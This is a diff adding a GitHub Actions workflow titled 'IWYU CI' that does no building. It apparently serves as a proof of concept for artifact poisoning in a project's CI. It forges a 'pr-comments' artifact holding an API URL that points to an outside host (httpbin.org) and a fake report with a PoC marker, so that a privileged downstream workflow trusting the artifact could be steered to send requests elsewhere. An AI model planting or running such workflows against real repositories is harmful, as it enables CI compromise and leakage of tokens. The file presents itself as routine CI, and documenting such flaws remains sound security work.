@@ -1,0 +1,17 @@
+name: IWYU CI
+on:
+  pull_request:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create forged pr-comments artifact
+        run: |
+          mkdir -p pr-comments
+          printf '%s' 'https://httpbin.org/anything' > pr-comments/api-url
+          printf '### forged dogfood report\n\nPOC_ARTIFACT_TRUST_MARKER_2026\n' > pr-comments/iwyu-dogfood.md
+          ls -l pr-comments
+      - uses: actions/upload-artifact@v4
+        with:
+          name: pr-comments
+          path: pr-comments
